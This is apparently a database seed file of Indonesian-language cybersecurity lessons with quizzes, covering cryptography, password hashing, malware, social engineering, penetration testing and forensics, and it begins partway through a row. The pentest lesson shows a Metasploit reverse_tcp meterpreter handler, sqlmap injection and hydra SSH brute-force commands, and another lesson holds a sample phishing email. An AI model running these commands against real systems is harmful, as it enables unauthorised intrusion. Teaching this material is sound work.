```python
# Python: AES-GCM dengan cryptography
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = AESGCM.generate_key(bit_length=256)
nonce = os.urandom(12)
aesgcm = AESGCM(key)
ciphertext = aesgcm.encrypt(nonce, b"rahasia", None)
plaintext = aesgcm.decrypt(nonce, ciphertext, None)
```

## Enkripsi Asimetris

Menggunakan **pasangan kunci** (public & private). Publik untuk mengenkripsi, privat untuk mendekripsi. Cocok untuk pertukaran kunci dan tanda tangan digital.

- **Algoritma**: RSA (2048+/4096 bit), ECC (Curve25519, P-256), Ed25519.
- **Penggunaan**: TLS/HTTPS, SSH, PGP, signal protocol.

```bash
# Generate SSH keypair modern dengan Ed25519
ssh-keygen -t ed25519 -C "user@example.com" -f ~/.ssh/id_ed25519

# Generate RSA 4096 untuk kompatibilitas lama
ssh-keygen -t rsa -b 4096 -C "user@example.com"
```

## Fungsi Hash

Hash satu arah menghasilkan **digest** tetap dari input berapa pun. Properti: preimage-resistant, second preimage-resistant, collision-resistant.

- **Untuk integritas**: SHA-256, SHA-3, BLAKE3.
- **Untuk password**: bcrypt, scrypt, argon2id (dengan salt + work factor).
- **Hindari**: MD5, SHA-1 (collision ditemukan).

```bash
# Hash file dengan SHA-256
sha256sum disk.iso

# Hash password dengan argon2 (via argon2-cli)
echo -n "mypassword" | argon2 somesalt -id -t 3 -m 16 -p 1 -l 32
```

## MAC & Tanda Tangan Digital

- **MAC (Message Authentication Code)** — simetris, contoh HMAC-SHA256. Memverifikasi integritas dan autentikasi, tetapi penerima bisa memalsukan.
- **Digital Signature** — asimetris (Ed25519, ECDSA, RSA-PSS). Hanya pemilik private key yang bisa menandatangani, memberi non-repudiation.

```python
# Tanda tangan Ed25519
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
priv = Ed25519PrivateKey.generate()
pub  = priv.public_key()
sig  = priv.sign(b"dokumen penting")
pub.verify(sig, b"dokumen penting")  # raises on invalid
```

## Pertukaran Kunci & TLS

**Diffie-Hellman** memungkinkan dua pihak menyepakati kunci bersama tanpa pernah mengirimkannya. **TLS 1.3** menggabungkan ECDHE (ephemeral DH kurva eliptis) untuk perfect forward secrecy, dengan sertifikat X.509 untuk autentikasi server. TLS 1.3 juga menghapus cipher lemah dan RTT berlebih.

## PKI & Sertifikat

Public Key Infrastructure mengatur penerbitan sertifikat oleh Certificate Authority (CA). Sertifikat berisi public key, identitas, dan tanda tangan CA. Browser mempercayai CA yang ada di root store. **Let''s Encrypt** menyediakan sertifikat gratis via ACME protocol.

```bash
# Dapatkan sertifikat gratis Let''s Encrypt
sudo certbot --nginx -d example.com -d www.example.com

# Cek rantai sertifikat
openssl s_client -connect example.com:443 -showcerts
```

## Tips & Best Practices

- Jangan pernah membuat algoritma kriptografi sendiri—gunakan library standar.
- Gunakan HTTPS everywhere, redirect HTTP ke HTTPS.
- Rotasi kunci dan kelola dengan KMS/Vault.
- Aktifkan HSTS untuk mencegah downgrade attack.
- Verifikasi rantai sertifikat dan pinning bila perlu (mobile apps).

## Kesimpulan

Kriptografi adalah fondasi kepercayaan digital. Memahami perbedaan simetri/asimetri, hash vs password hashing, serta tanda tangan digital membuat Anda mampu memilih algoritma yang tepat untuk setiap kasus. Selalu ikuti rekomendasi terkini dari NIST dan IETF— kriptografi adalah ilmu yang terus berkembang.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '🔐', false, '[{"question":"Algoritma enkripsi simetris yang direkomendasikan saat ini?","options":["MD5","AES-256-GCM","RSA-1024","SHA-1"],"answer":1,"explanation":"AES-256-GCM adalah simetris modern dengan authenticated encryption."},{"question":"Algoritma hash yang TIDAK boleh digunakan untuk password?","options":["Argon2id","bcrypt","scrypt","MD5"],"answer":3,"explanation":"MD5 terlalu cepat dan rawan collision, tidak aman untuk password."},{"question":"Pasangan kunci yang digunakan dalam kriptografi asimetris?","options":["Salt & pepper","Public & private key","IV & nonce","Token & session"],"answer":1,"explanation":"Asimetris menggunakan public key (enkripsi) dan private key (dekripsi)."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('password-security-hashing', 6, 9, 'Password Security & Hashing', 'password-security-hashing', 'Hashing password, salt, brute force, dan password manager.', '# Password Security & Hashing


![Password Security & Hashing](https://sfile.chatglm.cn/images-ppt/e397dfcf2e9a.jpg)

Password adalah bentuk autentikasi paling umum—dan paling sering disalahkan dalam insiden keamanan. Penyimpanan password yang salah dapat menyebabkan kebocoran massal saat database dicuri. Materi ini menjelaskan cara menghash password dengan benar, melindungi dari serangan brute force, dan mendorong praktik password yang sehat bagi pengguna akhir.

![Password Security & Hashing](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Mengapa Password Harus Dihash

Menyimpan password plaintext adalah bencana: satu insiden SQL Injection dan seluruh akun pengguna terbongkar. Hashing satu arah memastikan bahkan admin database pun tidak bisa tahu password asli. Saat pengguna login, hash dari input dibandingkan dengan hash yang tersimpan—tidak pernah ada "dekripsi" password.

## Algoritma Hash yang Aman untuk Password

Hashing password membutuhkan algoritma **lambat dan mahal komputasi**, bukan hash cepat seperti SHA-256. Tujuannya agar brute force tidak ekonomis.

| Algoritma | Karakteristik | Rekomendasi |
|-----------|--------------|-------------|
| **Argon2id** | Memory-hard, winner PHC 2015 | ✅ Default modern |
| **bcrypt** | Battle-tested, work factor | ✅ Stabil & luas |
| **scrypt** | Memory-hard | ✅ Alternatif |
| **PBKDF2** | Iterasi tinggi | ⚠️ Lebih lemah dari argon2 |
| MD5/SHA-1/SHA-256 | Cepat, rawan GPU/ASIC | ❌ Jangan dipakai |

```python
# Python: hashing password dengan argon2
from argon2 import PasswordHasher, exceptions

ph = PasswordHasher(
    time_cost=3,        # iterasi
    memory_cost=65536,  # 64 MB
    parallelism=4,
    hash_len=32,
    salt_len=16
)

hash_str = ph.hash("mySecretPassword")
# Verifikasi
try:
    ph.verify(hash_str, "mySecretPassword")  # True
except exceptions.VerifyMismatchError:
    print("Password salah")
```

## Salt & Pepper

- **Salt** — nilai acak unik per password, disimpan bersama hash. Mencegah rainbow table attack.
- **Pepper** — secret server-side yang ditambahkan sebelum hash, TIDAK disimpan di DB. Memerlukan kompromi server dan DB untuk retas.

Library seperti bcrypt/argon2 otomatis mengelola salt—Anda tidak perlu mengelola manual.

## Serangan terhadap Password

1. **Brute force** — mencoba semua kombinasi.
2. **Dictionary attack** — daftar kata umum + variasi.
3. **Credential stuffing** — menggunakan pasangan email:password dari leak lain.
4. **Rainbow table** — precomputed hash (dimitigasi oleh salt).
5. **GPU/ASIC attack** — memanfaatkan paralelisme (dimitigasi oleh memory-hard).

## Kebijakan Password Modern

NIST SP 800-63B (revisi 2017) mengubah pandangan lama:

- ✅ Minimal 8 karakter (atau 6 untuk user-chosen dengan kompromi).
- ✅ Izinkan panjang hingga 64 karakter dan semua karakter ASCII/Unicode.
- ✅ Bandingkan dengan daftar password bocor (HaveIBeenPwned API).
- ❌ JANGAN wajibkan kompleksitas (huruf besar/kecil/angka/simbol) yang memicu pola "Password1!".
- ❌ JANGAN wajibkan rotasi periodik tanpa alasan.
- ✅ Blokir password yang umum ("password", "123456", nama aplikasi).

## MFA dan Passwordless

Multi-Factor Authentication menambah lapisan: **something you know** (password), **something you have** (token/hp), **something you are** (biometrik). Standar modern:

- **TOTP** — Google Authenticator, Authy (RFC 6238).
- **WebAuthn / FIDO2** — kunci hardware (YubiKey) atau platform authenticator.
- **Push notification** — Duo, Microsoft Authenticator.
- **SMS OTP** — kurang aman (SIM swap), hindari untuk akun sensitif.

```python
# Implementasi TOTP sederhana
import pyotp, time

secret = pyotp.random_base32()
totp = pyotp.TOTP(secret, interval=30, digits=6)
print("QR untuk pengguna:", pyotp.totp.TOTP(secret).provisioning_uri(
    name="user@example.com", issuer_name="MyApp"))
print("Kode saat ini:", totp.now())
```

## Password Manager

Dorong pengguna memakai password manager (Bitwarden, 1Password, KeePass) untuk:

- Generate password acak panjang (16+ karakter) unik per layanan.
- Simpan dengan enkripsi AES-256 + zero-knowledge.
- Auto-fill untuk mencegah phishing (hanya domain yang cocok).

## Tips & Best Practices

- Selalu rehash saat parameter work factor naik (transparent upgrade).
- Implementasikan rate limiting dan CAPTCHA di endpoint login.
- Log kegagalan login dan kirim notifikasi email "new login from device".
- Sediakan flow recovery yang aman (reset token short-lived, single-use).
- Lakukan breach monitoring untuk akun pengguna.

## Kesimpulan

Password security adalah kombinasi algoritma yang tepat (argon2id/bcrypt), kebijakan yang berbasis risiko (bukan kompleksitas kaku), dan MFA. Dengan menerapkan standar NIST modern dan passwordless, Anda melindungi pengguna bahkan ketika database bocor. Keamanan password bukan tentang kompleksitas, tetapi tentang keunikan dan hashing yang benar.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '🔑', false, '[{"question":"Algoritma hash password yang paling direkomendasikan saat ini?","options":["MD5","SHA-256","Argon2id","Base64"],"answer":2,"explanation":"Argon2id adalah pemenang Password Hashing Competition, memory-hard dan tahan GPU."},{"question":"Nilai acak unik per password untuk mencegah rainbow table?","options":["Pepper","Salt","IV","Nonce"],"answer":1,"explanation":"Salt unik per password membuat precomputed table tidak efektif."},{"question":"Standar MFA berbasis kunci hardware yang modern?","options":["SMS OTP","WebAuthn/FIDO2","Email link","Security question"],"answer":1,"explanation":"WebAuthn/FIDO2 menggunakan public key cryptography dan tahan phishing."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('malware-virus', 6, 10, 'Malware & Virus', 'malware-virus', 'Jenis malware, cara kerja, dan strategi pertahanan endpoint.', '# Malware & Virus


![Malware & Virus](https://sfile.chatglm.cn/images-ppt/2e8490eab537.png)

**Malware** (malicious software) adalah perangkat lunak yang dirancang untuk merusak, mencuri, atau mengontrol sistem tanpa persetujuan pengguna. Bentuknya beragam—virus, worm, trojan, ransomware, spyware, rootkit—dan terus berevolusi mengikuti pertahanan. Memahami cara kerja malware membantu Anda membangun pertahanan endpoint dan respons insiden yang efektif.

![Malware & Virus](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Klasifikasi Malware

### Virus
Menginfeksi file host dan menyebar saat file dijalankan. Tidak bisa berjalan sendiri—membutuhkan host.

### Worm
Menyebar otomatis melalui jaringan tanpa intervensi pengguna. Contoh: Conficker, Stuxnet, WannaCry (yang menggunakan exploit EternalBlue SMB).

### Trojan
Menyamar sebagai aplikasi sah, membuka backdoor. Contoh: Emotet, TrickBot.

### Ransomware
Mengenkripsi file korban dan meminta tebusan. Variants terkenal: CryptoLocker, LockBit, Conti, BlackCat/ALPHV. Sering disebarkan via RDP brute force, phishing, atau exploit.

### Spyware & Adware
Memata-matai aktivitas pengguna atau menampilkan iklan paksa. Contoh: Pegasus (spyware mobile), keylogger.

### Rootkit
Bersembunyi di level kernel (mode driver) atau bootloader untuk menghindari deteksi. Contoh: NTRootkit, LoJack BIOS rootkit.

### Fileless Malware
Bermukim di memori, PowerShell, WMI, atau registry—tidak meninggalkan file di disk. Sulit dideteksi signature-based.

## Siklus Hidup Serangan

1. **Initial Access** — phishing, exploit, brute force RDP, supply chain.
2. **Execution** — payload (PowerShell, macro, executable).
3. **Persistence** — scheduled task, registry Run key, service.
4. **Privilege Escalation** — exploit local, token impersonation.
5. **Defense Evasion** — disable AV, clear log, obfuscation.
6. **Credential Access** — Mimikatz, LSASS dump.
7. **Discovery & Lateral Movement** — port scan, pass-the-hash, SMB/WMI.
8. **Collection & Exfiltration** — archive data, exfil via HTTPS/DNS.
9. **Impact** — ransomware encryption, data destruction.

MITRE ATT&CK mengkodifikasi taktik dan teknik ini sebagai referensi standar.

## Cara Mendeteksi Malware

### Signature-based
Cocokkan hash, string, atau pola file dengan database threat. Cepat tetapi lemah terhadap varian baru.

### Heuristic & Behavior-based
Menganalisis perilaku (API calls, network connections, registry changes). Mendeteksi varian baru. Basis dari EDR modern.

### Machine Learning
Model ML menilai file berdasarkan ribuan fitur. Digunakan oleh Windows Defender, CrowdStrike, SentinelOne.

```bash
# Scan dengan ClamAV
sudo clamscan -r --bell -i /home/

# Analisis file mencurigakan di VirusTotal
curl -s --request POST --url https://www.virustotal.com/api/v3/files \
  --header "x-apikey: $VT_API_KEY" --form file=@./sample.exe

# Cek persistence umum di Windows (PowerShell as admin)
Get-ScheduledTask | Where-Object {$_.State -ne ''Disabled''}
Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location
```

## Strategi Pertahanan Endpoint

1. **EDR (Endpoint Detection & Response)** — CrowdStrike, SentinelOne, Defender for Endpoint. Bukan hanya antivirus—mendeteksi, menginvestigasi, dan merespons.
2. **Application Whitelisting** — AppLocker, WDAC. Hanya biner yang ditandatangani yang boleh jalan.
3. **Patch Management** — tutup CVE sebelum eksploitasi. WannaCry menyebar karena SMBv1 tidak di-patch.
4. **Email Security** — gateways dengan sandbox detonasi attachment.
5. **Macro Control** — disable Office macro by default.
6. **Privilege Separation** — user biasa tidak punya admin lokal.
7. **Network Segmentation** — batasi lateral movement.

## Analisis Malware (Pendahuluan)

Saat menemukan sampel malware, **jangan menjalankannya di mesin kerja**. Gunakan lab terisolasi:

```text
Lab analisis malware:
- VM terisolasi (VirtualBox/VMware, no shared folder, host-only network)
- REMnux / FlareVM sebagai OS analisis
- Tools: PEStudio, Detect It Easy, Wireshark, Procmon, x64dbg, Ghidra
- Sandbox otomatis: Cuckoo, Any.run, Joe Sandbox
```

Analisis statis (mengubah file tanpa menjalankan) meliputi strings, import table, entropy, dan disassembling. Analisis dinamis menjalankan sampel di sandbox dan mengamati perilaku.

## Ransomware: Mitigasi Khusus

- Backup offline/immutable yang tidak bisa dihapus oleh akun terinfeksi.
- Segmentasi jaringan, batasi RDP exposure (atau nonaktifkan).
- Aktifkan tamper protection di AV.
- Punya playbook incident response khusus ransomware.
- Jangan membayar tebusan—mendorong bisnis kriminal dan tidak menjamin recovery.

## Tips & Best Practices

- Aktifkan logging Sysmon di Windows untuk threat hunting.
- Deploy MFA di semua akses remote (VPN, RDP).
- Latih pengguna waspada terhadap email attachment dan macro.
- Lakukan threat hunting berkala menggunakan MITRE ATT&CK.
- Siapkan offline backup yang teruji restore.

## Kesimpulan

Malware terus berevolusi, tetapi praktik dasar pertahanan tetap sama: patch tepat waktu, EDR modern, segmentasi, backup, dan edukasi pengguna. Pendekatan defense in depth yang menggabungkan teknologi, proses, dan manusia tetap merupakan strategi paling efektif melindungi organisasi dari ancaman malware modern.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '🦠', false, '[{"question":"Malware yang mengenkripsi file korban dan meminta tebusan?","options":["Trojan","Ransomware","Spyware","Rootkit"],"answer":1,"explanation":"Ransomware mengenkripsi data dan menuntut tebusan untuk kunci dekripsi."},{"question":"Malware yang menyebar otomatis tanpa intervensi pengguna?","options":["Virus","Worm","Trojan","Adware"],"answer":1,"explanation":"Worm mereplikasi diri via jaringan tanpa host file."},{"question":"Tools standar untuk analisis malware terisolasi?","options":["Wireshark di mesin kerja","Sandbox REMnux/FlareVM","Excel pivot","Browser devtools"],"answer":1,"explanation":"Lab REMnux/FlareVM terisolasi aman untuk detonasi sampel malware."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('social-engineering', 6, 11, 'Social Engineering', 'social-engineering', 'Phishing, pretexting, baiting, dan cara membangun budaya keamanan.', '# Social Engineering


![Social Engineering](https://sfile.chatglm.cn/images-ppt/3986387e7191.png)

**Social engineering** adalah manipulasi faktor manusia untuk membocorkan informasi atau melakukan aksi yang merugikan. Tidak peduli seberapa canggih teknologi pertahanan, satu karyawan yang tertipu bisa membuka pintu bagi penyerang. Studi menunjukkan bahwa mayoritas insiden dimulai dengan vektor sosial—manusia adalah mata rantai terlemah sekaligus pertahanan terkuat jika dilatih.

![Social Engineering](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Mengapa Social Engineering Efektif

Manusia memiliki bias psikologis yang dieksploitasi penyerang:

- **Authority** — kepatuhan pada figur otoritas ("ini dari CEO/CFO").
- **Urgency** — tekanan waktu ("akun diblokir dalam 1 jam").
- **Social proof** — "semua orang sudah update".
- **Reciprocity** — "saya sudah bantu, sekarang giliran Anda".
- **Curiosity** — "lihat dokumen rahasia ini".
- **Greed/Fear** — bonus fiktif atau ancaman hukum.

## Jenis Social Engineering

### Phishing
Email palsu menyamar sebagai entitas terpercaya. Variannya:
- **Spear phishing** — tertarget, hasil riset LinkedIn dst.
- **Whaling** — menargetkan eksekutif (C-level).
- **Clone phishing** — duplikat email sah sebelumnya dengan link berubah.
- **Business Email Compromise (BEC)** — penyamaran eksekutif untuk transfer dana.

### Vishing & Smishing
- **Vishing (voice phishing)** — telepon mengaku dari bank, IT support, atau pemerintah.
- **Smishing (SMS phishing)** — paket jne palsu, hadiah, OTP social engineering.

### Pretexting
Penyerang menciptakan skenario/skenario (pretext) untuk mendapatkan informasi: "saya dari vendor audit, butuh konfirmasi data".

### Baiting & Quid Pro Quo
- **Baiting** — flash disk tertinggal di parkiran berlabel "Gaji 2024", korban mencolokkan.
- **Quid pro quo** — "saya dari support, akan percepat komputer Anda, install teamviewer".

### Tailgating & Physical
- **Tailgating** — masuk pintu dengan mengikuti karyawan yang berbadged.
- **Shoulder surfing** — mengintip password dari belakang.
- **Dumpster diving** — mengais sampah dokumen.

## Contoh Email Phishing Klasik

```text
Subject: [URGENT] Akun Anda Akan Diblokir dalam 24 Jam

Pelanggan Yth,

Kami mendeteksi aktivitas tidak biasa pada akun Anda. Untuk menghindari
pemblokiran permanen, harap verifikasi identitas Anda dalam 24 jam:

  👉 https://secure-bank-verify.com/login

Hormat kami,
Tim Keamanan Bank ABC

Tanda: email dari bank-secure@mail.ru, link ke domain yang bukan bank,
gaya bahasa mendesak, logo buram.
```

## Tanda-tanda Phishing

1. Domain/email pengirim tidak cocok (gmail/yahoo untuk "bank").
2. Salam umum ("Pelanggan Yth") bukan nama.
3. Tautan hover menunjukkan domain berbeda.
4. Permintaan data sensitif via email (bank asli tidak pernah minta PIN/password).
5. Attachment tak diharapkan (.zip, .html, macro Office).
6. Kesalahan tata bahasa, desain logo buram.
7. Tekanan emosional (urgency, fear, hadiah).

## Membangun Budaya Keamanan

### 1. Simulasi Phishing Berkala
Kirim phishing palsu internal, ukur klik rate, dan latih yang gagal. Platform: KnowBe4, Proofpoint Security Awareness, GoPhish (open source).

### 2. Pelatihan Singkat & Relevan
Modul mikro 5-10 menit lebih efektif daripada training tahunan membosankan. Topik: password, MFA, phishing, BYOD, public WiFi.

### 3. Proses Verifikasi
- Minta pegawai selalu verifikasi via channel lain (telepon langsung ke nomor resmi) untuk permintaan finansial.
- Implementasikan "out-of-band verification" untuk transaksi besar.

### 4. Laporan Mudah
Tombol "Report Phishing" di email client. Beri apresiasi/leaderboard untuk laporan yang akurat.

```bash
# Analisis header email phishing
# Ekstrak Received, SPF, DKIM, DMARC
cat email.eml | grep -iE "^(Received|Authentication-Results|From|Reply-To):"

# Cek reputasi domain/url
curl -s "https://urlhaus-api.abuse.ch/v1/url/" -d "url=https://suspicious.example"
```

## Defense Teknis Pendukung

- **DMARC (p=reject)** + SPF + DKIM — mencegah spoofing domain.
- **Email gateway** dengan sandbox attachment & link rewrite.
- **MFA** yang tahan phishing (WebAuthn/FIDO2).
- **DNS filtering** (Cisco Umbrella, Quad9).
- **Browser isolation** untuk klik link mencurigakan.

## Tips & Best Practices

- Budaya "no-blame" untuk pelaporan—jangan hukum yang tertipu, beri apresiasi.
- Verifikasi semua permintaan finansial via minimal 2 channel.
- Review social media exposure (LinkedIn info jabatan → target spear phishing).
- Latih staf front desk & helpdesk sebagai garis pertahanan.
- Lakukan exercise physical social engineering tahunan.

## Kesimpulan

Social engineering mengeksploitasi manusia, bukan teknologi. Pertahanan terbaik adalah kombinasi edukasi berkelanjutan, proses verifikasi, dan kontrol teknis seperti DMARC + FIDO2. Manusia yang terlatih dan diberdayakan adalah sensor keamanan paling efektif—jauh melampaui alat otomatis manapun.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '🎭', false, '[{"question":"Phishing tertarget yang menargetkan eksekutif C-level?","options":["Smishing","Whaling","Vishing","Pharming"],"answer":1,"explanation":"Whaling adalah spear phishing yang menargetkan pejabat tinggi (whale)."},{"question":"Teknik social engineering dengan menaruh flash disk berbahaya?","options":["Pretexting","Baiting","Tailgating","Vishing"],"answer":1,"explanation":"Baiting memancing korban mengambil objek (USB) yang sebenarnya berbahaya."},{"question":"Mekanisme email yang mencegah spoofing domain pengirim?","options":["DMARC + SPF + DKIM","TLS 1.3","PGP signing","S/MIME"],"answer":0,"explanation":"Kombinasi SPF, DKIM, dan DMARC memvalidasi pengirim email."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('penetration-testing-basics', 6, 12, 'Penetration Testing Basics', 'penetration-testing-basics', 'Metodologi pentest, tools, dan pelaporan kerentanan.', '# Penetration Testing Basics


![Penetration Testing Basics](https://sfile.chatglm.cn/images-ppt/b960626436f4.jpg)

**Penetration Testing (pentest)** adalah simulasi serangan terhadap sistem dengan izin tertulis untuk menemukan kerentanan sebelum penyerang nyata melakukannya. Pentest berbeda dari vulnerability scan—scan otomatis menemukan, pentest mengonfirmasi dan mengeksploitasi. Tujuannya memberi gambaran realistis tentang risiko dan efektivitas pertahanan.

![Penetration Testing Basics](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Jenis Pentest Berdasarkan Informasi

1. **Black Box** — tester tidak tahu apa-apa tentang target (menyerupai penyerang eksternal).
2. **White Box** — tester diberi akses source code, arsitektur, kredensial (audit komprehensif).
3. **Gray Box** — kombinasi (mis. punya akun user biasa untuk menguji privilege escalation).

## Jenis Pentest Berdasarkan Cakupan

- **Network pentest** — eksternal (public IP) dan internal (LAN).
- **Web application pentest** — OWASP-based, frontend+API.
- **Mobile app pentest** — Android/iOS, server API, cert pinning.
- **Wireless pentest** — WiFi (WPA2/3, evil twin), Bluetooth.
- **Social engineering pentest** — phishing, physical.
- **Red team exercise** — simulasi APT multi-vektor dengan tujuan spesifik.

## Fase Pentest (PTES)

### 1. Pre-engagement Interactions
- Scope, RoE (Rules of Engagement), timeline, batasan.
- Kontrak, NDA, authorization letter (surat izin tertulis).
- Komunikasi escalation & emergency contacts.

### 2. Intelligence Gathering (Recon)
```bash
# OSINT domain/subdomain
amass enum -d example.com
subfinder -d example.com -silent

# DNS profiling
dig any example.com
dnsenum example.com

# Web recon
whatweb https://example.com
nmap -sV -p- example.com
```

### 3. Threat Modeling
Identifikasi aset, ancaman, dan vektor. Mengacu MITRE ATT&CK atau OWASP.

### 4. Vulnerability Analysis
```bash
# Network vulnerability scanner
nmap --script vuln example.com
nessus -i target.list

# Web app scanner
nuclei -u https://example.com -t cves/
docker run --rm -t owasp/zap2docker-stable zap-baseline.py -t https://example.com
```

### 5. Exploitation
Mengonfirmasi kerentanan benar-benar dapat dieksploitasi.

```bash
# Metasploit framework
msfconsole
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST 10.0.0.5
msf> exploit

# SQLi otomatis
sqlmap -u "https://example.com/item?id=1" --batch --dbs --threads=4

# Brute force login
hydra -L users.txt -P pass.txt ssh://10.0.0.10
```

### 6. Post-Exploitation
- Privilege escalation (LinPEAS, WinPEAS).
- Lateral movement (pass-the-hash, kerberoasting).
- Persistence (backdoor, scheduled task).
- Data exfiltration simulasi.

### 7. Reporting
Output utama pentest adalah laporan—bukan exploit itu sendiri.

## Standar & Framework

- **PTES** (Penetration Testing Execution Standard).
- **OWASP Testing Guide** untuk aplikasi web.
- **MITRE ATT&CK** untuk klasifikasi taktik/teknik.
- **NIST SP 800-115** technical guide to testing.
- **CVSS** v3.1 untuk skoring severity.

## Format Laporan Pentest

```text
1. Executive Summary  — risiko bisnis, ringkasan temuan kritikal
2. Methodology        — jenis test, scope, batasan
3. Findings           — per temuan:
   - Title & CVSS score
   - Deskripsi & affected asset
   - Reproduction steps (PoC)
   - Impact
   - Remediation recommendation
4. Appendix           — raw output, tools, timeline
```

## Tools Pentest Populer

| Kategori | Tools |
|----------|-------|
| Recon/OSINT | Amass, Subfinder, Maltego, theHarvester |
| Scanning | Nmap, Masscan, Nessus, OpenVAS |
| Web | Burp Suite, OWASP ZAP, nuclei, ffuf |
| Exploitation | Metasploit, SQLmap, BeEF |
| Password | Hashcat, John, Hydra, CrackMapExec |
| C2 | Cobalt Strike, Sliver, Mythic |
| Post-exp | LinPEAS, WinPEAS, Mimikatz, BloodHound |

## Tips & Best Practices

- Selalu dapat **izin tertulis** sebelum memulai—tanpa itu, ini kejahatan.
- Patuhi scope dan batasan waktu. Jangan sentuh sistem di luar cakupan.
- Catat log aktivitas untuk audit dan timeline.
- Hindari destruktif: jangan drop table, hapus file, atau DDoS production.
- Beri vendor waktu patch sebelum publikasi temuan (responsible disclosure).

## Kesimpulan

Pentest adalah investasi yang membuktikan postur keamanan secara empiris. Dengan metodologi yang jelas, tools yang tepat, dan laporan yang actionable, pentest membantu organisasi memprioritaskan perbaikan berdasarkan risiko nyata—bukan asumsi. Yang membedakan pentester profesional dari penyerang adalah **izin, etika, dan tanggung jawab**.



## Studi Kasus: Security Audit

Reconnaissance, Scanning, Testing, Exploitation, Reporting.

## Tips

> Hanya uji sistem yang Anda miliki atau punya izin tertulis.', '⚔️', false, '[{"question":"Jenis pentest di mana tester tidak tahu apa-apa tentang target?","options":["White Box","Black Box","Gray Box","Crystal Box"],"answer":1,"explanation":"Black Box mensimulasikan penyerang eksternal tanpa informasi internal."},{"question":"Standar skoring severity kerentanan yang umum dipakai?","options":["CVSS","ISO 9001","ITIL","PCI-DSS"],"answer":0,"explanation":"CVSS (Common Vulnerability Scoring System) menilai severity 0-10."},{"question":"Tools untuk SQL injection otomatis?","options":["Nmap","sqlmap","Wireshark","Metasploit"],"answer":1,"explanation":"sqlmap adalah tools otomatis untuk mendeteksi & eksploitasi SQLi."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('digital-forensics', 6, 13, 'Digital Forensics', 'digital-forensics', 'Pengumpulan bukti digital, chain of custody, dan tools forensik.', '# Digital Forensics


![Digital Forensics](https://sfile.chatglm.cn/images-ppt/af57c8aa621a.jpg)

**Digital forensics** adalah proses pengumpulan, pelestarian, analisis, dan presentasi bukti digital untuk keperluan hukum atau investigasi internal. Tidak seperti pentest yang menyerang, forensik bekerja **setelah** insiden terjadi. Disiplin ini membutuhkan ketelitian tinggi karena kesalahan kecil dapat merusak rantai bukti dan menggugurkan keabsahan di pengadilan.

![Digital Forensics](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Prinsip Dasar Forensik

1. **Do No Harm** — jangan mengubah bukti asli.
2. **Chain of Custody** — setiap perpindahan bukti tercatat (siapa, kapan, di mana, mengapa).
3. **Acquisition** — buat image forensik (bit-by-bit) dari media.
4. **Verification** — hash SHA-256/MD5 untuk membuktikan integritas.
5. **Reproducibility** — analisis harus dapat diulang dengan hasil sama.

## Cabang Digital Forensics

- **Disk forensics** — hard drive, SSD, USB.
- **Memory forensics** — RAM dump untuk malware fileless, running process.
- **Network forensics** — pcap, netflow, proxy logs.
- **Mobile forensics** — Android, iOS (encrypted backup).
- **Cloud forensics** — log AWS CloudTrail, M365 audit.
- **Email forensics** — header, MIME, attachment.
- **IoT/Embedded forensics** — firmware extraction.

## Siklus Investigasi Forensik

### 1. Identification
Tentukan scope, jenis insiden, dan bukti potensial.

### 2. Preservation
- Isolasi sistem dari jaringan untuk mencegah perubahan.
- Untuk live system, capture RAM sebelum shutdown (banyak artefak hilang saat power off).

```bash
# Capture RAM Windows dengan WinPmem
winpmem_mini_x64.exe output.dump

# Capture RAM Linux dengan LiME (perlu modul kernel)
insmod lime.ko "path=/tmp/ram.lime format=lime"

# Isolasi jaringan tanpa shutdown
ip link set eth0 down
```

### 3. Acquisition
Buat image forensik disk—bukan salinan file biasa.

```bash
# Image dengan dd + kompresi + hash
sudo dd if=/dev/sda bs=4M | gzip -c > /evidence/disk.img.gz
sha256sum /evidence/disk.img.gz > /evidence/disk.img.gz.sha256

# Lebih baik gunando dc3dd atau ewfacquire
dc3dd if=/dev/sda of=/evidence/disk.dd hash=sha256 log=acquisition.log

# Atau format EWF (Expert Witness Format) dengan ewfacquire
ewfacquire /dev/sda
```

### 4. Analysis
Analisis dengan tools forensik:

```bash
# Autopsy GUI + Sleuth Kit CLI
fls disk.dd                       # list file
icat disk.dd 12345                # extract inode
mmls disk.dd                      # partisi
tsk_recover disk.dd /output/      # recover deleted

# Memory forensik dengan Volatility 3
vol -f ram.dump windows.pslist    # daftar proses
vol -f ram.dump windows.netscan   # koneksi network
vol -f ram.dump windows.malfind   # injeksi kode
```

### 5. Reporting
Laporan forensik harus:

- Jelaskan tools, versi, dan metode yang digunakan.
- Sertakan timestamp dalam UTC dan zona waktu lokal.
- Lampirkan hash dan chain of custody.
- Hindari opini yang tidak didukung bukti.
